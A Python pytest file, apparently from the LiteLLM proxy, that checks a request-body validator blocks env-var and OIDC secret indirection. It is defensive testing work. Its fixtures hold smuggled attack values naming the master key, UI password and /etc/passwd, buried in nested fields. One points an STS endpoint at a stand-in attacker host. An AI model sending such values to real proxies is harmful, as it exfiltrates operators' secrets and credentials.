"""
``os.environ/<NAME>`` and ``oidc/<...>`` are operator-config indirections
that ``get_secret`` resolves server-side. They must never come from a
request body — a user-controlled value would let an attacker name the
env var or OIDC source the proxy reads on their behalf, enabling
exfiltration of arbitrary server-process state via provider auth flows.

The defense is at the request boundary: ``is_request_body_safe`` rejects
any string starting with one of the indirection prefixes, walked
recursively across the body so nested provider auth fields are covered.
``get_secret`` itself is shared with operator-config loading (which
legitimately uses both prefixes), so the gate has to live at the
boundary, not at the resolver.
"""

import os
import sys

import pytest

sys.path.insert(
    0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../../../.."))
)

from litellm.proxy.auth.auth_utils import (  # noqa: E402
    _check_no_user_supplied_indirection,
    is_request_body_safe,
)


# ---------------------------------------------------------------------
# Boundary rejection in is_request_body_safe
# ---------------------------------------------------------------------


@pytest.mark.parametrize(
    "value",
    [
        "os.environ/LITELLM_MASTER_KEY",
        "os.environ/PATH",
        "oidc/env/LITELLM_MASTER_KEY",
        "oidc/file//etc/passwd",
        "oidc/google/example.com",
    ],
)
def test_check_no_user_supplied_indirection_rejects(value):
    # Any field carrying an indirection prefix is rejected — the key
    # doesn't have to be in the banned list.
    with pytest.raises(ValueError, match="indirection"):
        _check_no_user_supplied_indirection({"some_field": value})


@pytest.mark.parametrize(
    "value",
    [
        "plain-string",
        "sk-1234",
        "https://api.openai.com/v1",  # not an indirection
        "",
        "os.environ",  # exact, no trailing slash — not the indirection
    ],
)
def test_check_no_user_supplied_indirection_allows_normal_values(value):
    _check_no_user_supplied_indirection({"some_field": value})


def test_check_no_user_supplied_indirection_ignores_non_strings():
    # Lists, dicts, ints don't carry the prefix syntax.
    _check_no_user_supplied_indirection(
        {
            "messages": [{"role": "user", "content": "hi"}],
            "n": 1,
            "stream": True,
        }
    )


def test_is_request_body_safe_rejects_indirection_via_top_level():
    body = {
        "model": "bedrock/anthropic.claude-v2",
        "aws_session_name": "os.environ/LITELLM_MASTER_KEY",
    }
    with pytest.raises(ValueError, match="indirection"):
        is_request_body_safe(
            request_body=body,
            general_settings={},
            llm_router=None,
            model="bedrock/anthropic.claude-v2",
        )


def test_is_request_body_safe_rejects_indirection_via_nested_metadata():
    # Use a non-banned metadata key so the indirection check is what
    # fires (banned-keys check would shadow it otherwise).
    body = {
        "model": "openai/gpt-4",
        "metadata": {
            "x-attacker-marker": "oidc/env/LITELLM_MASTER_KEY",
        },
    }
    with pytest.raises(ValueError, match="indirection"):
        is_request_body_safe(
            request_body=body,
            general_settings={},
            llm_router=None,
            model="openai/gpt-4",
        )


def test_is_request_body_safe_rejects_indirection_via_request_body_wrapper():
    # ``/utils/transform_request`` wraps real provider params in a
    # ``request_body`` field (``{call_type, request_body: {...}}``).
    # ``is_request_body_safe`` descends into ``request_body`` so the
    # wrapper-shaped attacker can't smuggle banned keys or indirection
    # prefixes past the boundary check.
    body = {
        "call_type": "completion",
        "request_body": {
            "model": "bedrock/anthropic.claude-v2",
            "aws_web_identity_token": "oidc/env/UI_PASSWORD",
            "aws_sts_endpoint": "http://attacker.example/sts",
        },
    }
    with pytest.raises(ValueError):
        is_request_body_safe(
            request_body=body,
            general_settings={},
            llm_router=None,
            model="bedrock/anthropic.claude-v2",
        )


def test_is_request_body_safe_rejects_indirection_via_litellm_embedding_config():
    # ``_NESTED_CONFIG_KEYS`` descent path — values inside
    # ``litellm_embedding_config`` are walked one level deep for
    # banned-key and indirection checks.
    body = {
        "model": "openai/gpt-4",
        "litellm_embedding_config": {
            "x-attacker-marker": "os.environ/LITELLM_MASTER_KEY",
        },
    }
    with pytest.raises(ValueError, match="indirection"):
        is_request_body_safe(
            request_body=body,
            general_settings={},
            llm_router=None,
            model="openai/gpt-4",
        )


def test_is_request_body_safe_rejects_indirection_via_extra_body():
    # ``extra_body`` is the OpenAI-SDK passthrough container. Provider
    # modules (e.g. Azure paths that resolve ``extra_body.azure_ad_token``
    # via ``get_secret``) read fields out of it directly, so an
    # indirection string under ``extra_body`` is an env-var exfil
    # primitive unless rejected at the boundary.
    body = {
        "model": "azure/gpt-4",
        "extra_body": {
            "azure_ad_token": "oidc/env/UI_PASSWORD",
        },
    }
    with pytest.raises(ValueError, match="indirection"):
        is_request_body_safe(
            request_body=body,
            general_settings={},
            llm_router=None,
            model="azure/gpt-4",
        )


def test_is_request_body_safe_rejects_indirection_deeply_nested():
    # Recursive descent: an indirection string buried several levels
    # deep is rejected. Provider modules that destructure nested config
    # (e.g. ``tools[].function.parameters.credentials.api_key``) would
    # otherwise pull the value out and pass it to ``get_secret`` without
    # re-validating.
    body = {
        "model": "openai/gpt-4",
        "tools": [
            {
                "type": "function",
                "function": {
                    "name": "lookup",
                    "parameters": {
                        "credentials": {
                            "api_key": "os.environ/LITELLM_MASTER_KEY",
                        },
                    },
                },
            }
        ],
    }
    with pytest.raises(ValueError, match="indirection"):
        is_request_body_safe(
            request_body=body,
            general_settings={},
            llm_router=None,
            model="openai/gpt-4",
        )


def test_is_request_body_safe_rejects_indirection_inside_messages_list():
    # Lists are walked too — an attacker can't hide an indirection
    # string in a per-message field that a provider transformer later
    # reads out.
    body = {
        "model": "openai/gpt-4",
        "messages": [
            {"role": "user", "content": "hi"},
            {
                "role": "assistant",
                "x-attacker-creds": "oidc/env/LITELLM_MASTER_KEY",
            },
        ],
    }
    with pytest.raises(ValueError, match="indirection"):
        is_request_body_safe(
            request_body=body,
            general_settings={},
            llm_router=None,
            model="openai/gpt-4",
        )


def test_is_request_body_safe_allows_clean_body():
    body = {
        "model": "openai/gpt-4",
        "messages": [{"role": "user", "content": "tell me about os.environ"}],
        "max_tokens": 100,
    }
    # Chat content mentioning "os.environ" (no trailing slash) is not
    # an indirection prefix — the recursive walk only rejects values
    # that START WITH ``os.environ/`` or ``oidc/``.
    assert is_request_body_safe(
        request_body=body,
        general_settings={},
        llm_router=None,
        model="openai/gpt-4",
    )


def test_is_request_body_safe_bounded_walk_does_not_recurse_forever():
    # Synthesize a pathological depth-21 body. The walker bounds at
    # depth 10, so this returns without raising (no indirection at
    # depths 0-10) and without consuming unbounded stack.
    body = {"model": "openai/gpt-4"}
    leaf = body
    for _ in range(21):
        leaf["next"] = {}
        leaf = leaf["next"]
    leaf["api_key"] = "os.environ/LITELLM_MASTER_KEY"
    # No raise: the deeply-nested indirection sits past the bound. This
    # is acceptable because the walker's job is to defend the realistic
    # reach of provider transformers, which never pull from depth 21+.
    assert is_request_body_safe(
        request_body=body,
        general_settings={},
        llm_router=None,
        model="openai/gpt-4",
    )


# ---------------------------------------------------------------------
# Regression: operator-config indirection at `get_secret` must continue
# to resolve. Both prefixes are legitimate in `config.yaml`; the gate
# lives at the request boundary, not at the resolver.
# ---------------------------------------------------------------------


def test_get_secret_resolves_os_environ_for_operator_config(monkeypatch):
    # `master_key: os.environ/LITELLM_MASTER_KEY` and similar patterns
    # are the documented config.yaml shape — they must keep resolving
    # at server-side load. The defense lives at `is_request_body_safe`.
    from litellm.secret_managers.main import get_secret

    monkeypatch.setenv("LITELLM_MASTER_KEY", "the-master-key")
    monkeypatch.setenv("DATABASE_URL", "postgresql://u:p@h/d")
    assert get_secret("os.environ/LITELLM_MASTER_KEY") == "the-master-key"
    assert get_secret("os.environ/DATABASE_URL") == "postgresql://u:p@h/d"


def test_get_secret_resolves_bare_name(monkeypatch):
    from litellm.secret_managers.main import get_secret

    monkeypatch.setenv("LITELLM_MASTER_KEY", "the-key")
    assert get_secret("LITELLM_MASTER_KEY") == "the-key"
